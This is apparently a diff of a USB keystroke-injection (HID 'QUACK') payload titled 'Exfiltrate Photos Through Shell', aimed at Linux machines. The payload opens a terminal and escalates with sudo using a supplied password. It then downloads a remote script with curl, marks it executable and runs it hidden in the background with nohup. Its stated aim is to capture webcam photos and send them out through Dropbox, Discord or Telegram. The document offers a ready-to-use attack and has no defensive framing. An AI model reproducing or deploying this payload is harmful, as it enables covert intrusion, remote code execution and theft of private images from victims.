@@ -1,58 +1,57 @@
-* ##################################################
-* #                                                |
-* # Title        : Exfiltrate Photos Through Shell |
-* # Author       : Aleff                           |
-* # Version      : 1.0                             |
-* # Category     : Exfiltration                    |
-* # Target       : Linux                           |
-* #                                                |
-* ##################################################
+##################################################
+#                                                #
+# Title        : Exfiltrate Photos Through Shell #
+# Author       : Aleff                           #
+# Version      : 1.0                             #
+# Category     : Exfiltration                    #
+# Target       : Linux                           #
+#                                                #
+##################################################
 
-* Requirements:
-*     - Internet Connection
-*     - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
-*     - sudo permissions
-*         - if you need to install 'fswebcam'
-*         - for add the -x permission to the script.sh downloaded
+ATTACKMODE HID
 
+# Requirements:
+#  - Internet Connection
+#  - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
+#  - sudo permissions
+#   - if you need to install 'fswebcam'
+#   - for add the -x permission to the script.sh downloaded
 
-QUACK DELAY 1000
+# VARIABLES
+# - sudo Password
+SUDO-PSWD='example'
+# - replace example.com with your script.sh link
+SCRIPT-SH-LINK='example'
+
+QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 2000
 
-* #### Permission ####
-
-* This section of sudo time depends by the computer power on which it runs.
-* So if you know that the computer on which you run the payload is too slow, increase it by a few seconds, otherwise you can try running it as it is set now or smaller depending on your needs.
-
+#### Permission ####
+# This section of sudo time depends by the computer power on which it runs.
+# So if you know that the computer on which you run the payload is too slow, increase it by a few seconds, otherwise you can try running it as it is set now or smaller depending on your needs.
 QUACK STRING sudo su
 QUACK ENTER
 QUACK DELAY 500
-* REQUIRED - sudo Password
-QUACK STRING SUDO-PSWD
+QUACK STRING $SUDO-PSWD
 QUACK ENTER
-* DELAY Based On Computer Power
+# DELAY Based On Computer Power
 QUACK DELAY 5000
 
-* If you want to install the dependency of fswebcam you should decommend it.
-* QUACK STRING apt install fswebcam -y
-* QUACK ENTER
-* QUACK DELAY Based On Internet Power
-* QUACK DELAY 5000
+# If you want to install the dependency of fswebcam you should decommend it.
+# QUACK STRING apt install fswebcam -y
+# QUACK ENTER
+# QUACK DELAY Based On Internet Power
+# QUACK DELAY 5000
 
 
-* #### Script ####
-
-
-* REQUIRED - replace example.com with your script.sh link
-QUACK STRING curl SCRIPT-SH-LINK > script.sh
+#### Script ####
+QUACK STRING curl $SCRIPT-SH-LINK > script.sh
 QUACK ENTER
-* DELAY Based On Internet Power
+# DELAY Based On Internet Power
 QUACK DELAY 4000
-
 QUACK STRING chmod +x script.sh
 QUACK ENTER
 QUACK DELAY 500
-
 QUACK STRING nohup ./script.sh > /dev/null 2>&1 & exit
 QUACK ENTER
